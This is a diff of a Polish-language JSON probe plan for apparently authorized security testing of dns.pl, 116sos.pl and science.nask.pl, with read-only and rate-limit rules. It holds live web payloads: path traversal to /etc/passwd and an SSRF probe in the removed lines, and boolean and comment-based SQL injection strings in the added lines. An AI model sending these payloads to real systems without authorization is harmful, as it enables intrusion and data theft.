@@ -1,193 +1,191 @@
 {
-  "_opis": "Runda 8: dwie nowe powierzchnie wynikajace z mapy tras w reports/analysis-run003.json (129 bundli JS zespolu, przeczytane offline). (A) 116sos.pl /api/og-image?imageId= — jedyny endpoint, ktory w kodzie klienckim jest wolany z REALNYMI identyfikatorami (18650, 30225, 30263, 30267, 30278); jesli serwer sklada z tej wartosci sciezke do pliku albo URL do WordPressa, to jest tu LFI albo SSRF z odczytem (klasa 15 / 5). (B) dns.pl /api/who-is-xml i /api/domain-browser sa POST-only (GET = 404 Drupala, zmierzone w rundzie 8); obie sa ODCZYTOWE (whois, dostepnosc domeny) — pytanie brzmi, czy serwer egzekwuje captcha i jak traktuje pole name/domain. (C) parametry trzech potwierdzonych tras JSON dns.pl (kontrola zakresu paginacji) i (D) parametr query w science.nask.pl /api/search (sygnal SQLi, klasa 4).",
-  "_zasady": "GET wszędzie, z JEDNYM wyjątkiem: POST na dns.pl /api/who-is-xml/* i /api/domain-browser/* — oba są zapytaniami ODCZYTOWYMI (whois, sprawdzenie dostępności domeny), nie tworzą stanu. Guard POST jest w kodzie (post_allowed), nie w komentarzach. Tempo 2 req/s, bez logowania, bez podążania za przekierowaniami poza zakres. Każda sonda jest odejmowana od catch-all hostu.",
+  "_opis": "Runda 9: trzy rzeczy, które wyszły z rundy 8. (A) science.nask.pl /api/search ODRZUCA zapytania krótsze niż 3 znaki — wszystkie wcześniejsze testy SQLi były NIEWAŻNE (mierzyły walidację długości, nie bazę). Teraz para kontrolna: ten sam prefiks z apostrofem, z warunkiem prawdziwym i fałszywym. (B) 116sos.pl /api/og-image przyjmuje numeryczne imageId i dla nieistniejącego zwraca STAŁY obrazek zastępczy 28 862 B — to oracle na istnienie załącznika; sprawdzamy ID z bundla i losowe wysokie. (C) dns.pl POST na who-is-xml zwrócił stronę HTML 200 (nie JSON) — sprawdzamy, czy to kwestia braku nagłówka AJAX / końcowego ukośnika, plus reszta tras GET. (D) centres-search: czy jest paginacja (q jest ignorowane, ale może jest page/limit).",
+  "_zasady": "GET + POST wyłącznie na odczytowych trasach dns.pl (guard w kodzie: post_allowed). Tempo 2 req/s. Bez logowania. Bez podążania za przekierowaniami poza zakres. Każda sonda odejmowana od catch-all hostu, a odpowiedzi porównywane także po sha12 (ciągi cyfr i hex znormalizowane) — dopiero różnica sha12 przy tej samej długości jest sygnałem.",
   "checks": [
     {
-      "id": "s8-116-og-known-18650",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=18650",
-      "why": "Kontrola pozytywna: ID wystepuje w kodzie klienckim trzy razy (og-image dla udostepnianej strony). Czy endpoint w ogole zwraca obraz?",
-      "class": "info"
-    },
-    {
-      "id": "s8-116-og-known-30225",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=30225",
-      "why": "Druga kontrola pozytywna z innej grupy ID (30225/30263/30267/30278). Dwa rozne obrazy = endpoint dziala i jest parametryzowany.",
-      "class": "info"
-    },
-    {
-      "id": "s8-116-og-miss-9",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=9",
-      "why": "Kontrola negatywna: niskie ID prawie na pewno nie istnieje. Bez niej kazda odpowiedz 500 jest nieodrozinalna od bledu dla poprawnego ID.",
-      "class": "info"
-    },
-    {
-      "id": "s8-116-og-alpha",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=abc",
-      "why": "Kontrola typu: wartosc nieliczbowa. Rozny status/rozmiar niz 'miss' = serwer nie rzutuje na int, czyli wartosc moze trafic do sciezki lub URL.",
-      "class": "info"
-    },
-    {
-      "id": "s8-116-og-dotdot",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=../../../../etc/passwd",
-      "why": "Path traversal w parametrze, ktory najpewniej sluzy do zlozenia sciezki pliku (klasa 15). Warunek odrzucenia: odpowiedz identyczna jak 'alpha'/'miss' (czyli parametr jest rzutowany na int przed uzyciem).",
-      "class": "15"
-    },
-    {
-      "id": "s8-116-og-dotdot-enc",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-      "why": "Ten sam traversal, zakodowany — czesc filtrÃ³w normalizuje przed dekodowaniem, a czesc po. Rozna odpowiedz niz poprzednia sonda = dekodowanie po walidacji.",
-      "class": "15"
-    },
-    {
-      "id": "s8-116-og-abs",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=/etc/passwd",
-      "why": "Sciezka absolutna zamiast wzglednej: jesli parametr jest doklejany do katalogu, wynik bedzie inny niz przy traversal.",
-      "class": "15"
-    },
-    {
-      "id": "s8-116-og-relative-media",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=wp-content/uploads/sites/4/2025/01/Designer-11.png",
-      "why": "Sciezka wzgledna do istniejacego, publicznego pliku WordPressa (ta sama, ktora serwuje science.nask.pl/api/media). 200 = parametr steruje sciezka => traversal wyzej ma znaczenie.",
-      "class": "15"
-    },
-    {
-      "id": "s8-116-og-url",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/og-image?imageId=https://example.com/x.png",
-      "why": "Jesli wartosc trafia do fetcha po stronie serwera (a nie do readFile), to jest tu SSRF. Warunek odrzucenia: identyczna odpowiedz jak kontrolki (parametr nie jest URL-em).",
-      "class": "5"
-    },
-    {
-      "id": "s8-dns-whois-json",
-      "host": "dns.pl",
-      "method": "POST",
-      "path": "/api/who-is-xml/pl",
-      "body": "{\"name\":\"nask.pl\"}",
-      "json": true,
-      "why": "ODCZYT (whois). Czy endpoint przyjmuje cialo JSON bez tokenu captcha? 200 z XML = captcha nieegzekwowana po stronie serwera (samo w sobie nieplaten klasa, ale otwiera test pola name).",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-whois-captcha-empty",
-      "host": "dns.pl",
-      "method": "POST",
-      "path": "/api/who-is-xml/pl",
-      "body": "{\"name\":\"nask.pl\",\"captcha\":\"\"}",
-      "json": true,
-      "why": "To samo z pustym polem captcha — zgodnie z kontraktem z bundla (name + captcha). Roznica wobec poprzedniej sondy pokazuje, czy pole jest w ogole czytane.",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-whois-captcha-junk",
-      "host": "dns.pl",
-      "method": "POST",
-      "path": "/api/who-is-xml/pl",
-      "body": "{\"name\":\"nask.pl\",\"captcha\":\"naskhunt-test\"}",
-      "json": true,
-      "why": "Kontrola egzekwowania captchy: niepoprawny token. Jesli ta sonda i 'captcha-empty' daja TEN SAM wynik co 'whois-json', pole jest ignorowane.",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-browser-json",
-      "host": "dns.pl",
-      "method": "POST",
-      "path": "/api/domain-browser/pl",
-      "body": "{\"domain\":\"nask.pl\"}",
-      "json": true,
-      "why": "ODCZYT (dostepnosc domeny). Czy dziala bez recaptcha? Ta trasa jest ciekawsza od whois, bo odpowiada na pytanie 'czy domena jest wolna' — czyli siega do rejestru.",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-browser-form",
-      "host": "dns.pl",
-      "method": "POST",
-      "path": "/api/domain-browser/pl",
-      "body": "domain=nask.pl",
-      "headers": {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      "why": "Ten sam odczyt, ale jako formularz — Vue potrafi wyslac oba warianty. Rozny wynik = rozny parser po stronie serwera (sygnal o implementacji).",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-list-size-999",
-      "host": "dns.pl",
-      "method": "GET",
-      "path": "/api/registrars-list/pl/999/1",
-      "why": "Kontrola paginacji: czy serwer respektuje dowolny rozmiar strony. Dane sa publiczne (rejestratorzy), wiec to nie jest wyciek — chodzi o to, czy parametr jest walidowany.",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-list-page-0",
-      "host": "dns.pl",
-      "method": "GET",
-      "path": "/api/registrars-list/pl/20/0",
-      "why": "Strona 0: ujawnia, czy numer strony jest liczony od 0 czy 1 (i czy nie ma off-by-one w zapytaniu).",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-funny-name",
-      "host": "dns.pl",
-      "method": "GET",
-      "path": "/api/funny-name/pl",
-      "why": "Jedyna trasa dns.pl z bundla, ktorej nie zmierzylismy. GET bez parametrow — mapa, nie atak.",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-services",
-      "host": "dns.pl",
-      "method": "GET",
-      "path": "/api/registrars-services",
-      "why": "Trasa z bundla bez odpowiednika w naszej mapie. Slownik uslug rejestratorow — sprawdzamy, czy zwraca wiecej niz strona pokazuje.",
-      "class": "info"
-    },
-    {
-      "id": "s8-dns-stats",
-      "host": "dns.pl",
-      "method": "GET",
-      "path": "/api/stats/",
-      "why": "Trasa /api/stats/ (z bundla, inna niz /api/zone-stats). Jesli zwraca dane spoza publicznego wykresu — klasa 3; jesli tylko to samo — zamykamy.",
-      "class": "info"
-    },
-    {
-      "id": "s8-sci-q-quote",
+      "id": "s9-sci-ctl-nask",
       "host": "science.nask.pl",
       "method": "GET",
-      "path": "/api/search?query=%27&lang=pl",
-      "why": "Sygnal SQLi (klasa 4): apostrof w parametrze, ktory trafia do WP_Query. Warunek odrzucenia: odpowiedz identycznej dlugosci i struktury jak 'sci-q-miss'.",
+      "path": "/api/search?query=nask&lang=pl",
+      "why": "Kontrola pozytywna SQLi: zapytanie 4-znakowe, które istnieje w bazie. Bez tego nie wiadomo, jak wygląda 'trafienie'.",
+      "class": "info"
+    },
+    {
+      "id": "s9-sci-ctl-miss",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=zqxzz&lang=pl",
+      "why": "Kontrola negatywna: 5 znaków, brak trafień. Wzorzec pustej odpowiedzi 200.",
+      "class": "info"
+    },
+    {
+      "id": "s9-sci-q-quote",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=nask%27&lang=pl",
+      "why": "SQLi: apostrof po poprawnym prefiksie. Warunek odrzucenia: identyczny sha12 jak 'ctl-nask' (apostrof zneutralizowany) albo identyczny jak 'ctl-miss' (filtr wycina zapytanie).",
       "class": "4"
     },
     {
-      "id": "s8-sci-q-miss",
+      "id": "s9-sci-q-quote2",
       "host": "science.nask.pl",
       "method": "GET",
-      "path": "/api/search?query=zzzqqqxx&lang=pl",
-      "why": "Kontrola negatywna dla poprzedniej sondy: ciag, ktorego nie ma w bazie. Bez tego pusta odpowiedz na apostrof nic nie znaczy.",
+      "path": "/api/search?query=nask%27%27&lang=pl",
+      "why": "Dwa apostrofy: jeśli serwer escapuje pojedynczy, podwójny domyka i zmienia składnię. Różnica wobec poprzedniej sondy = wartość jest wstrzykiwana, nie tylko escapowana.",
+      "class": "4"
+    },
+    {
+      "id": "s9-sci-bool-true",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=nask%27%20AND%20%271%27%3D%271&lang=pl",
+      "why": "Para boolowska, warunek PRAWDZIWY. Musi zwrócić ten sam zbiór co 'ctl-nask', inaczej sam apostrof psuje zapytanie.",
+      "class": "4"
+    },
+    {
+      "id": "s9-sci-bool-false",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=nask%27%20AND%20%271%27%3D%272&lang=pl",
+      "why": "Para boolowska, warunek FAŁSZYWY. DOWÓD SQLi = true zwraca wyniki, false nie zwraca, przy identycznym prefiksie. To jest jedyny akceptowalny dowód w tej klasie.",
+      "class": "4"
+    },
+    {
+      "id": "s9-sci-comment",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=nask%27--%20-&lang=pl",
+      "why": "Komentarz SQL po apostrofie: jeśli zadziała, reszta oryginalnego zapytania znika i wynik wraca do zbioru 'nask' — drugi, niezależny sygnał tej samej klasy.",
+      "class": "4"
+    },
+    {
+      "id": "s9-sci-lang-en",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=nask&lang=en",
+      "why": "Kontrola parametru lang: czy w ogóle zmienia odpowiedź. Bez tego test 'lang=pl\\'' byłby niemiarodajny.",
       "class": "info"
     },
     {
-      "id": "s8-sci-q-empty",
+      "id": "s9-sci-lang-quote",
       "host": "science.nask.pl",
       "method": "GET",
-      "path": "/api/search?query=&lang=pl",
-      "why": "Kontrola pozytywna: puste zapytanie zwraca zbior domyslny — pokazuje, jak wyglada 'dziala'. Porownanie z apostrofem ma sens tylko wzgledem tego.",
+      "path": "/api/search?query=nask&lang=pl%27",
+      "why": "Apostrof w lang: drugi parametr tej samej trasy, rzadko walidowany tak samo jak query.",
+      "class": "4"
+    },
+    {
+      "id": "s9-116-cs-base",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=",
+      "why": "Baseline paginacji: ile rekordów i jaki totalItems zwraca trasa bez parametrów strony.",
+      "class": "info"
+    },
+    {
+      "id": "s9-116-cs-page2",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=&page=2",
+      "why": "Czy istnieje paginacja. Jeśli sha12 identyczny jak baseline — parametr ignorowany (tak jak q), wątek zamknięty.",
+      "class": "info"
+    },
+    {
+      "id": "s9-116-cs-limit",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=&limit=500",
+      "why": "Czy limit jest respektowany. Więcej rekordów niż w UI = dostęp do placówek niepublikowanych (klasa 3). Mniej/tyle samo = brak znaczenia.",
+      "class": "3"
+    },
+    {
+      "id": "s9-116-cs-skip",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=&skip=5",
+      "why": "Alternatywna nazwa paginacji (skip/offset). Jeśli page i limit są ignorowane, to jest ostatnia tania próba.",
+      "class": "info"
+    },
+    {
+      "id": "s9-116-og-known-30263",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/og-image?imageId=30263",
+      "why": "ID z bundla (lista 18650, 30225, 30263, 30267, 30278) — kontrolka, że oracle rozpoznaje prawdziwe załączniki.",
+      "class": "info"
+    },
+    {
+      "id": "s9-116-og-known-30278",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/og-image?imageId=30278",
+      "why": "Druga kontrolka z tej samej listy.",
+      "class": "info"
+    },
+    {
+      "id": "s9-116-og-miss-40000",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/og-image?imageId=40000",
+      "why": "Losowe wysokie ID: czy spada na obrazek zastępczy 28 862 B. Jeśli tak, to mamy dyskryminator 'istnieje / nie istnieje'.",
+      "class": "info"
+    },
+    {
+      "id": "s9-116-og-miss-99999",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/og-image?imageId=99999",
+      "why": "Druga próbka dyskryminatora — musi dać ten sam sha12 co 40000, inaczej 'fallback' nie jest stały i oracle nie istnieje.",
+      "class": "info"
+    },
+    {
+      "id": "s9-dns-whois-slash",
+      "host": "dns.pl",
+      "method": "POST",
+      "path": "/api/who-is-xml/pl/",
+      "body": "{\"name\":\"nask.pl\"}",
+      "json": true,
+      "headers": {
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "why": "ODCZYT whois. W rundzie 8 POST bez ukośnika zwrócił stronę HTML 200 (51 KB) — sprawdzamy wariant z ukośnikiem i nagłówkiem AJAX, bo Drupal po tym nagłówku rozgałęzia odpowiedź.",
+      "class": "info"
+    },
+    {
+      "id": "s9-dns-browser-slash",
+      "host": "dns.pl",
+      "method": "POST",
+      "path": "/api/domain-browser/pl/",
+      "body": "{\"domain\":\"nask.pl\"}",
+      "json": true,
+      "headers": {
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "why": "ODCZYT dostępności domeny, ten sam wariant. 200 + JSON = trasa żyje i captcha nie jest egzekwowana po stronie serwera.",
+      "class": "info"
+    },
+    {
+      "id": "s9-dns-funny-slash",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/funny-name/pl/",
+      "why": "Trasa z bundla; bez ukośnika dała 404 (40 919 B). Ukośnik to typowa kanonizacja Symfony/Drupala.",
+      "class": "info"
+    },
+    {
+      "id": "s9-dns-stats-slash",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/stats/pl",
+      "why": "Trasa /api/stats/ z bundla: 404 przy pustym sufiksie, sprawdzamy wariant z lokalizacją.",
+      "class": "info"
+    },
+    {
+      "id": "s9-dns-count-deleted",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/count-deleted-domains",
+      "why": "Powtórka 1:1 (stabilność): ta sama trasa dała dziś {\"count\":\"+1085\"}. Kontrola, że zmiany w narzędziu nie zmieniły zachowania klienta HTTP.",
       "class": "info"
     }
   ]
